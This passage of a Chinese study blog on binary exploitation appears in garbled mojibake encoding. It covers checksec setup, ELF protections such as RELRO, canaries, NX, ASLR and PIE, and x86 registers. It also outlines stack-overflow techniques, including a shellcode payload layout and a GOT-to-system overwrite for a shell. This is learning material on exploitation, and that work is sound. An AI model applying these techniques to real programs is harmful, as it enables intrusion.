‡æ–‡ä»¶å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ï¼Œæ˜¯ç©äºŒè¿›åˆ¶ä¸å¯ç¼ºå°‘çš„å·¥å…·ã€‚ä¸Šä¸€æ­¥è£…çš„padaæ’ä»¶é‡Œå…¶å®æ˜¯åŒ…å«checksecçš„ï¼Œä½†æ˜¯ç‰ˆæœ¬æ¯”è¾ƒä¹…ã€‚å¯ä»¥è‡ªå·±å®‰è£…ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆæ§åˆ¶é«˜ç‰ˆæœ¬ git clone https://github.com/slimm609/checksec.sh.gitcd checksec.shsudo ln â€“sf checksec /usr/bin/checksec å¦‚æœè£…çš„æœ‰æ—§ç‰ˆçš„checksecï¼Œæ­¤æ—¶åˆ›å»ºè½¯é“¾æ¥å¯èƒ½ä¼šå¤±è´¥ï¼Œè€Œä¸”å°±ç®—åˆ›å»ºæˆåŠŸï¼Œå¯åŠ¨checksecæ£€æŸ¥å¯èƒ½è¿˜æ˜¯æ—§ç‰ˆï¼Œå› ä¸ºå¹¶æ²¡æœ‰è¿›è¡Œæ‰€æœ‰çš„æ›¿æ¢ï¼š è¿™é‡Œçš„Archæ˜¯ç¨‹åºæ¶æ„ä¿¡æ¯ï¼Œå¯ä»¥å¾—çŸ¥ç¨‹åºæ˜¯64ä½è¿˜æ˜¯32ä½çš„ï¼Œæœ‰åŠ©äºä¸ºç¼–å†™expæä¾›ä¿¡æ¯ã€‚å…¶ä»–çš„å†…å®¹å°±æ˜¯ä¿æŠ¤æœºåˆ¶å¼€å¯çš„æƒ…å†µäº†ï¼Œåé¢æ·±å…¥å­¦ä¹ ã€‚ æœ‰æ•ˆåŠæ³•æ˜¯å…ˆæ‰¾ä¸€ä¸‹æ—§ç‰ˆçš„æ–‡ä»¶éƒ½å­˜åœ¨å“ªäº›æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œç”¨find / -name checksecå‘½ä»¤æŸ¥æ‰¾ï¼š ç„¶åå…¨éƒ¨æ›¿æ¢ï¼Œå†æ¬¡æµ‹è¯•ï¼š å¯ä»¥çœ‹åˆ°æ–°ç‰ˆä¼šè¿›è¡Œæ›´å¤šçš„ä¿æŠ¤æœºåˆ¶çš„æµ‹è¯•ã€‚ ç”±äºpadaå†…ç½®æœ‰æ—§ç‰ˆçš„checksecï¼ˆè·Ÿå‰é¢æ›¿æ¢çš„æ—§ç‰ˆä¸æ˜¯åŒä¸€ä¸ªï¼‰ï¼Œåœ¨ç”¨gdbè°ƒè¯•ä¹‹å‰è¿›è¡Œæ£€æµ‹çš„è¯ï¼Œä»ç„¶æ˜¯æ—§ç‰ˆï¼š ä¸¤ä¸ªç‰ˆæœ¬å…±å­˜ï¼Œä¹ŸæŒºå¥½~ æµ…å­¦ELFä¿æŠ¤æœºåˆ¶ä¸Šä¸€èŠ‚æåˆ°äº†æ£€æŸ¥æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ï¼Œè¿™ä¸€èŠ‚å°±è®°å½•ä¸€ä¸‹Linuxæ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ç›¸å…³çŸ¥è¯†ï¼Œä»¥åçš„å­¦ä¹ å…ä¸äº†éƒ½ä¼šé‡åˆ°ã€‚ RELRORelocation Read Onlyï¼Œ é‡å®šä½è¡¨åªè¯»ã€‚é‡å®šä½è¡¨å³.gotå’Œ.pltä¸¤ä¸ªè¡¨ã€‚æ­¤é¡¹æŠ€æœ¯ä¸»è¦é’ˆå¯¹ GOT æ”¹å†™çš„æ”»å‡»æ–¹å¼ï¼Œåˆ†ä¸ºä¸¤ç§ï¼šPartial RELROå’ŒFull RELROã€‚Partical RELROæ˜“å—åˆ°æ”»å‡»ï¼Œä¾‹å¦‚æ”»å‡»è€…å¯ä»¥atoi.gotä¸ºsystem.pltï¼Œè¿›è€Œè¾“å…¥/bin/sh\\x00è·å¾—shellã€‚Full RELROä½¿æ•´ä¸ªGOTåªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚ Stack-canaryCanaryæ˜¯é‡‘ä¸é›€çš„æ„æ€ï¼ŒæŠ€æœ¯ä¸Šè¡¨ç¤ºæœ€å…ˆçš„æµ‹è¯•çš„æ„æ€ã€‚è¿™ä¸ªæ¥è‡ªä»¥å‰æŒ–ç…¤çš„æ—¶å€™ï¼ŒçŸ¿å·¥éƒ½ä¼šå…ˆæŠŠé‡‘ä¸é›€æ”¾è¿›çŸ¿æ´ï¼Œæˆ–è€…æŒ–ç…¤çš„æ—¶å€™ä¸€ç›´å¸¦ç€é‡‘ä¸é›€ã€‚é‡‘ä¸é›€å¯¹ç”²çƒ·å’Œä¸€æ°§åŒ–ç¢³æµ“åº¦æ¯”è¾ƒæ•æ„Ÿï¼Œä¼šå…ˆæŠ¥è­¦ã€‚æ‰€ä»¥å¤§å®¶éƒ½ç”¨canaryæ¥ææœ€å…ˆçš„æµ‹è¯•ã€‚stack canaryè¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤ã€‚ åœ¨å‡½æ•°è¿”å›å€¼ä¹‹å‰æ·»åŠ çš„ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼Œæœ«ä½ä¸º/x00ï¼ˆæä¾›äº†è¦†ç›–æœ€åä¸€å­—èŠ‚è¾“å‡ºæ³„éœ²canaryçš„å¯èƒ½ï¼‰ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œè¦†ç›–å†…å®¹è¦†ç›–åˆ°canaryå¤„ï¼Œå°±ä¼šæ”¹å˜åŸæœ¬è¯¥å¤„çš„æ•°å€¼ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šæ£€æŸ¥canaryå€¼æ˜¯å¦è·Ÿå¼€å§‹çš„å€¼ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·ï¼Œç¨‹åºä¼šå´©æºƒï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤è¿”å›åœ°å€çš„ç›®çš„ã€‚ NXNon-Executable Memoryï¼Œä¸å¯æ‰§è¡Œå†…å­˜ã€‚NXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚æ ˆæº¢å‡ºçš„æ ¸å¿ƒå°±æ˜¯é€šè¿‡å±€éƒ¨å˜é‡è¦†ç›–è¿”å›åœ°å€ï¼Œç„¶ååŠ å…¥shellcodeï¼ŒNXç­–ç•¥æ˜¯ä½¿æ ˆåŒºåŸŸçš„ä»£ç æ— æ³•æ‰§è¡Œã€‚ ç»•è¿‡è¿™ç±»ä¿æŠ¤æœ€å¸¸è§çš„æ–¹æ³•ä¸ºROP(Return-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹)ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºåœ¨æ ˆä¸Šå¸ƒç½®åœ°å€ï¼Œæ¯ä¸ªå†…å­˜åœ°å€å¯¹åº”ä¸€ä¸ªgadgetï¼Œåˆ©ç”¨retç­‰æŒ‡ä»¤è¿›è¡Œè¡”æ¥æ¥æ‰§è¡ŒæŸé¡¹åŠŸèƒ½ï¼Œæœ€ç»ˆè¾¾åˆ°pwnæ‰ç¨‹åºçš„ç›®çš„ã€‚ çœ‹åˆ°ç½‘ä¸Šå¸ˆå‚…è¯´ï¼šå½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†systemï¼ˆ'/bin/sh'ï¼‰ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦å»æ„é€ shellcodeã€‚è¿™ä¸ªæ…¢æ…¢å­¦å§ã€‚ ALSRAddress space layout randomizationï¼Œåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ã€‚æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–å°†æ•°æ®éšæœºæ”¾ç½®ï¼Œå¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚ ä½†æ˜¯åœ°å€éšæœºåŒ–ä¸æ˜¯å¯¹æ‰€æœ‰æ¨¡å—å’Œå†…å­˜åŒºéƒ½è¿›è¡ŒéšæœºåŒ–ï¼Œè™½ç„¶libcã€æ ˆã€å †çš„åŠ è½½ä½ç½®è¢«éšæœºåŒ–ï¼Œä½†ä¸»é•œåƒä¸ä¼šï¼Œè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„å…³é”®æ‰‹æ®µã€‚ PIEPosition-Independent Executableï¼Œ ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸ASLRæŠ€æœ¯ç±»ä¼¼ï¼ŒASLRå°†ç¨‹åºè¿è¡Œæ—¶çš„å †æ ˆä»¥åŠå…±äº«åº“çš„åŠ è½½åœ°å€éšæœºåŒ–, è€ŒPIEæŠ€æœ¯åˆ™åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³, å³ç¨‹åºè¿è¡Œæ—¶å„ä¸ªæ®µï¼ˆå¦‚ä»£ç æ®µç­‰ï¼‰åŠ è½½çš„è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯åœ¨è£…è½½æ—¶æ‰ç¡®å®šã€‚ è¿™å°±æ„å‘³ç€ï¼Œ åœ¨PIEå’ŒASLRåŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œ æ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œ ä¼ ç»Ÿçš„æ”¹å†™GOTè¡¨é¡¹çš„æ–¹æ³•ä¹Ÿéš¾ä»¥è¿›è¡Œï¼Œ å› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¨‹åºçš„.gotæ®µçš„è™šåœ°å€ã€‚ RPATH/RUNPATHç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“æ–‡ä»¶ä¼˜å…ˆä»è¯¥ç›®å½•å¯»æ‰¾ï¼Œå¯ä»¥fake libé€ æˆæ”»å‡»ã€‚å‚è€ƒå®ä¾‹ã€‚ FORTIFYç”±GCCå®ç°çš„æºç çº§åˆ«çš„ä¿æŠ¤æœºåˆ¶ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç ä»¥é¿å…æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚åŠ äº†è¿™ä¸ªä¿æŠ¤ä¹‹å,ä¸€äº›æ•æ„Ÿå‡½æ•°å¦‚read, fgets,memcpy, printfç­‰ç­‰å¯èƒ½å¯¼è‡´æ¼æ´å‡ºç°çš„å‡½æ•°éƒ½ä¼šè¢«æ›¿æ¢æˆ__read_chkï¼Œ__fgets_chkï¼Œ__memcpy_chkï¼Œ__printf_chkç­‰ã€‚ è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œé€šè¿‡æ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è·³è¿‡æŸäº›å‚æ•°ï¼ˆå¦‚ç›´æ¥%7$xï¼‰ç­‰æ–¹å¼æ¥é¿å…æ¼æ´å‡ºç°ã€‚ ä»¥ä¸Šå°±æ˜¯äº†è§£åˆ°çš„PWNä¸­å¸¸è§çš„ELFæ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶äº†ï¼Œä»¥åå­¦ä¹ è¿‡ç¨‹ä¸­é€æ­¥æ·±å…¥äº†è§£ã€‚ å…³äºå¯„å­˜å™¨åœ¨è¿›è¡Œå¸¸ç”¨çš„ä¸€äº›æŠ€æœ¯å­¦ä¹ ä¹‹å‰ï¼Œè¿˜éœ€æ¸©ä¹ ä¸€ä¸‹ä¹‹å‰å­¦è¿‡çš„å…³äºå¯„å­˜å™¨çš„çŸ¥è¯†ï¼Œæ¯•ç«Ÿæ˜¯åŸºç¡€çš„åŸºç¡€ã€‚ 32ä½x86æ¶æ„ä¸‹çš„å¯„å­˜å™¨å¯ä»¥è¢«ç®€å•åˆ†ä¸ºé€šç”¨å¯„å­˜å™¨å’Œç‰¹æ®Šå¯„å­˜å™¨ä¸¤ç±»ï¼Œé€šç”¨å¯„å­˜å™¨åœ¨å¤§éƒ¨åˆ†æ±‡ç¼–æŒ‡ä»¤ä¸‹æ˜¯å¯ä»¥ä»»æ„ä½¿ç”¨çš„ï¼ˆè™½ç„¶æœ‰äº›æŒ‡ä»¤è§„å®šäº†æŸäº›å¯„å­˜å™¨çš„ç‰¹å®šç”¨é€”ï¼‰ï¼Œè€Œç‰¹æ®Šå¯„å­˜å™¨åªèƒ½è¢«ç‰¹å®šçš„æ±‡ç¼–æŒ‡ä»¤ä½¿ç”¨ï¼Œä¸èƒ½ç”¨æ¥ä»»æ„å­˜å‚¨æ•°æ®ã€‚ é€šç”¨å¯„å­˜å™¨åŒ…æ‹¬ï¼šä¸€èˆ¬å¯„å­˜å™¨eaxã€ebxã€ecxã€edxï¼Œç´¢å¼•å¯„å­˜å™¨esiã€ediï¼Œä»¥åŠå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨espã€ebpã€‚å…¶ä¸­å„ç±»å¯„å­˜å™¨çš„ä½œç”¨å¦‚ä¸‹ï¼š ä¸€èˆ¬å¯„å­˜å™¨ï¼šç”¨æ¥å­˜å‚¨è¿è¡Œæ—¶æ•°æ®ï¼Œæ˜¯æŒ‡ä»¤æœ€å¸¸ç”¨åˆ°çš„å¯„å­˜å™¨ï¼Œé™¤äº†å­˜æ”¾ä¸€èˆ¬æ€§çš„æ•°æ®ï¼Œæ¯ä¸ªä¸€èˆ¬å¯„å­˜å™¨éƒ½æœ‰è‡ªå·±è¾ƒä¸ºå›ºå®šçš„ç‹¬ç‰¹ç”¨é€”ã€‚eaxè¢«ç§°ä¸ºç´¯åŠ å¯„å­˜å™¨ï¼ˆAccumulatorï¼‰ï¼Œç”¨ä»¥è¿›è¡Œç®—æ•°è¿ç®—å’Œè¿”å›å‡½æ•°ç»“æœç­‰ã€‚ebxè¢«ç§°ä¸ºåŸºå€å¯„å­˜å™¨ï¼ˆBaseï¼‰ï¼Œåœ¨å†…å­˜å¯»å€æ—¶ï¼ˆæ¯”å¦‚æ•°ç»„è¿ç®—ï¼‰ç”¨ä»¥å­˜æ”¾åŸºåœ°å€ã€‚ecxè¢«ç§°ä¸ºè®°æ•°å¯„å­˜å™¨ï¼ˆCounterï¼‰ï¼Œç”¨ä»¥åœ¨å¾ªç¯è¿‡ç¨‹ä¸­è®°æ•°ã€‚edxè¢«ç§°ä¸ºæ•°æ®å¯„å­˜å™¨ï¼ˆDataï¼‰ï¼Œå¸¸é…åˆeaxä¸€èµ·å­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®ã€‚ ç´¢å¼•å¯„å­˜å™¨ï¼šé€šå¸¸ç”¨äºå­—ç¬¦ä¸²æ“ä½œä¸­ï¼ŒesiæŒ‡å‘è¦å¤„ç†çš„æ•°æ®åœ°å€ï¼ˆSource Indexï¼‰ï¼ŒediæŒ‡å‘å­˜æ”¾å¤„ç†ç»“æœçš„æ•°æ®åœ°å€ï¼ˆDestination Indexï¼‰ã€‚ å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨espã€ebpç”¨äºä¿å­˜å‡½æ•°åœ¨è°ƒç”¨æ ˆä¸­çš„çŠ¶æ€ï¼Œå³æ ˆé¡¶å’Œæ ˆåº•ã€‚ ç‰¹æ®Šå¯„å­˜å™¨åŒ…æ‹¬ï¼šæ®µåœ°å€å¯„å­˜å™¨ssã€csã€dsã€esã€fsã€gsï¼Œæ ‡å¿—ä½å¯„å­˜å™¨EFLAGSï¼Œä»¥åŠæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨eipã€‚ ç°ä»£æ“ä½œç³»ç»Ÿå†…å­˜é€šå¸¸æ˜¯ä»¥åˆ†æ®µçš„å½¢å¼å­˜æ”¾ä¸åŒç±»å‹çš„ä¿¡æ¯çš„ã€‚å‡½æ•°è°ƒç”¨æ ˆå°±æ˜¯åˆ†æ®µçš„ä¸€ä¸ªéƒ¨åˆ†ï¼ˆStack Segmentï¼‰ã€‚å†…å­˜åˆ†æ®µè¿˜åŒ…æ‹¬å †ï¼ˆHeap Segmentï¼‰ã€æ•°æ®æ®µï¼ˆData Segmentï¼‰ã€BSSæ®µä»¥åŠä»£ç æ®µï¼ˆCode Segmentï¼‰ã€‚ä»£ç æ®µå­˜å‚¨å¯æ‰§è¡Œä»£ç å’Œåªè¯»å¸¸é‡ï¼ˆå¦‚å¸¸é‡å­—ç¬¦ä¸²ï¼‰ï¼Œå±æ€§å¯è¯»å¯æ‰§è¡Œï¼Œä½†é€šå¸¸ä¸å¯å†™ã€‚æ•°æ®æ®µå­˜å‚¨å·²ç»åˆå§‹åŒ–ä¸”åˆå€¼ä¸ä¸º0çš„å…¨å±€å˜é‡å’Œé™æ€å±€éƒ¨å˜é‡ï¼ŒBSSæ®µå­˜å‚¨æœªåˆå§‹åŒ–æˆ–åˆå€¼ä¸º0çš„å…¨å±€å˜é‡å’Œé™æ€å±€éƒ¨å˜é‡ï¼Œè¿™ä¸¤æ®µæ•°æ®éƒ½æœ‰å¯å†™çš„å±æ€§ã€‚å †ç”¨äºå­˜æ”¾ç¨‹åºè¿è¡Œä¸­åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ŒCè¯­è¨€ä¸­çš„malloc()å’Œfree()å‡½æ•°å°±æ˜¯åœ¨å †ä¸Šåˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚å„æ®µåœ¨å†…å­˜çš„æ’åˆ—å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å‡ ç§ç‰¹æ®Šå¯„å­˜å™¨ç”¨é€”å¦‚ä¸‹ï¼š æ®µåœ°å€å¯„å­˜å™¨ï¼šç”¨æ¥å­˜å‚¨å†…å­˜åˆ†æ®µåœ°å€çš„ï¼Œå…¶ä¸­å¯„å­˜å™¨sså­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„åœ°å€ï¼Œå¯„å­˜å™¨cså­˜å‚¨ä»£ç æ®µçš„åœ°å€ï¼Œå¯„å­˜å™¨dså­˜å‚¨æ•°æ®æ®µçš„åœ°å€ï¼Œesã€fsã€gsæ˜¯é™„åŠ çš„å­˜å‚¨æ•°æ®æ®µåœ°å€çš„å¯„å­˜å™¨ã€‚ æ ‡å¿—ä½å¯„å­˜å™¨ï¼ˆEFLAGSï¼‰ï¼š32ä½ä¸­çš„å¤§éƒ¨åˆ†è¢«ç”¨äºæ ‡å¿—æ•°æ®æˆ–ç¨‹åºçš„çŠ¶æ€ï¼Œä¾‹å¦‚OFï¼ˆOverflow Flagï¼‰å¯¹åº”æ•°å€¼æº¢å‡ºã€IFï¼ˆInterrupt Flagï¼‰å¯¹åº”ä¸­æ–­ã€ZFï¼ˆZero Flagï¼‰å¯¹åº”è¿ç®—ç»“æœä¸º0ã€CFï¼ˆCarry Flagï¼‰å¯¹åº”è¿ç®—äº§ç”Ÿè¿›ä½ç­‰ã€‚ æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆeipï¼‰ï¼šå­˜å‚¨ä¸‹ä¸€æ¡è¿è¡ŒæŒ‡ä»¤çš„åœ°å€ã€‚ äº†è§£äº†å„ç±»å¯„å­˜å™¨çš„ç”¨é€”ï¼Œä¸‹é¢å­¦ä¹ å¸¸ç”¨çš„æ¼æ´åˆ©ç”¨æ–¹æ³•æ‰‹æ®µã€‚ å¸¸ç”¨æŠ€æœ¯æ–¹æ³•é¦–å…ˆéœ€è¦æ·±å…¥ç†è§£æ ˆçš„å·¥ä½œåŸç†ï¼Œå‚è€ƒè¿™é‡Œã€‚ åœ¨å‘ç”Ÿå‡½æ•°è°ƒç”¨æˆ–è€…ç»“æŸå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¨‹åºçš„æ§åˆ¶æƒä¼šåœ¨å‡½æ•°çŠ¶æ€ä¹‹é—´å‘ç”Ÿè·³è½¬ï¼Œè¿™æ—¶é€šè¿‡ä¿®æ”¹å‡½æ•°çŠ¶æ€æ¥å®ç°æ”»å‡»ã€‚è€Œæ§åˆ¶ç¨‹åºæ‰§è¡ŒæŒ‡ä»¤æœ€å…³é”®çš„å¯„å­˜å™¨å°±æ˜¯eipï¼ˆå­˜æ”¾ä¸‹ä¸€æ¡è¦æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®©eipè½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€ã€‚ å¦‚æœè¦è®©eipæŒ‡å‘æ”»å‡»æŒ‡ä»¤ï¼Œéœ€è¦åšçš„å·¥ä½œï¼šé¦–å…ˆï¼Œåœ¨é€€æ ˆè¿‡ç¨‹ä¸­ï¼Œè¿”å›åœ°å€ä¼šè¢«ä¼ ç»™eipï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©æº¢å‡ºæ•°æ®ç”¨æ”»å‡»æŒ‡ä»¤çš„åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥äº†ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜å…¶ä»–ä½ç½®å¯»æ‰¾å¯ç”¨çš„æ”»å‡»æŒ‡ä»¤ã€‚å¦‚ä¸‹å›¾ï¼š å†æ¥çœ‹çœ‹å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå¦‚æœè¦è®©eipæŒ‡å‘æ”»å‡»æŒ‡ä»¤ï¼Œéœ€è¦å“ªäº›å‡†å¤‡ï¼Ÿè¿™æ—¶ï¼Œeipä¼šæŒ‡å‘åŸç¨‹åºä¸­æŸä¸ªæŒ‡å®šçš„å‡½æ•°ï¼Œæˆ‘ä»¬æ²¡æ³•é€šè¿‡æ”¹å†™è¿”å›åœ°å€æ¥æ§åˆ¶ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥â€œå·æ¢æ¢æŸ±â€ï¼ï¼å°†åŸæœ¬æŒ‡å®šçš„å‡½æ•°åœ¨è°ƒç”¨æ—¶æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ã€‚ å®ç°ä¸Šè¿°çš„æ”»å‡»ç›®çš„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹æŠ€æœ¯æ‰‹æ®µï¼š 1ã€Shellcodeï¼šä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤ 2ã€Return2libcï¼šä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•° 3ã€ROPï¼šä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤ 4ã€Hijack GOTï¼šä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•° ä¸‹é¢è¯¦ç»†è®°å½•å‡ ç§æ–¹æ³•çš„å­¦ä¹ ï¼š Shellcode ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤ è¯¥æŠ€æœ¯è¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œç”¨æ”»å‡»æŒ‡ä»¤çš„èµ·å§‹åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€ã€‚æ”»å‡»æŒ‡ä»¤ä¸€èˆ¬éƒ½æ˜¯ç”¨æ¥æ‰“å¼€shellï¼Œä»è€Œå¯ä»¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒï¼Œæ‰€ä»¥è¿™ç±»æŒ‡ä»¤ç‰‡æ®µä¹Ÿè¢«æˆä¸ºshellcodeã€‚shellcodeå¯ä»¥ç”¨æ±‡ç¼–è¯­è¨€æ¥å†™å†è½¬æˆå¯¹åº”çš„æœºå™¨ç ï¼Œä¹Ÿå¯ä»¥ä¸Šç½‘æœç´¢ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œä»¥åæ·±å…¥å­¦ä¹ ã€‚ æº¢å‡ºæ•°æ®çš„ç»„æˆå¦‚ä¸‹ï¼š payload = padding1 + address of shellcode + padding2 + shellcode å…¶åœ¨æ ˆå†…çš„åˆ†å¸ƒå¦‚ä¸‹å›¾ï¼š è¿™é‡Œå¯¹æº¢å‡ºæ•°æ®çš„ç»„æˆè¯¦ç»†è¯´æ˜ä¸€ä¸‹ï¼š padding1å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„å¦‚æœåˆ©ç”¨å­—ç¬¦ä¸²ç¨‹åºè¾“å…¥æº¢å‡ºæ•°æ®ä¸è¦åŒ…å«\\x00ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of shellcodeæ˜¯åé¢shellcodeèµ·å§‹å¤„çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2å¤„çš„æ•°æ®ä¹Ÿå¯ä»¥éšæ„å¡«å……ï¼Œé•¿åº¦å¯ä»¥ä»»æ„ã€‚shellcodeåº”è¯¥ä¸ºåå…­è¿›åˆ¶çš„æœºå™¨ç æ ¼å¼ã€‚ æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š 1ã€ è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®padding1åº”è¯¥å¤šé•¿ï¼Ÿ æˆ‘ä»¬å¯ä»¥ç”¨è°ƒè¯•å·¥å…·ï¼ˆä¾‹å¦‚gdbï¼‰æŸ¥çœ‹æ±‡ç¼–ä»£ç æ¥ç¡®å®šè¿™ä¸ªè·ç¦»ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œç¨‹åºæ—¶ç”¨ä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦çš„æ–¹æ³•æ¥è¯•æ¢ï¼ˆå¦‚æœè¿”å›åœ°å€è¢«æ— æ•ˆåœ°å€ä¾‹å¦‚AAAAè¦†ç›–ï¼Œç¨‹åºä¼šç»ˆæ­¢å¹¶æŠ¥é”™ï¼‰ã€‚ 2ã€shellcodeèµ·å§‹åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ æˆ‘ä»¬å¯ä»¥åœ¨è°ƒè¯•å·¥å…·é‡ŒæŸ¥çœ‹è¿”å›åœ°å€çš„ä½ç½®ï¼ˆå¯ä»¥æŸ¥çœ‹ebpçš„å†…å®¹ç„¶åå†åŠ 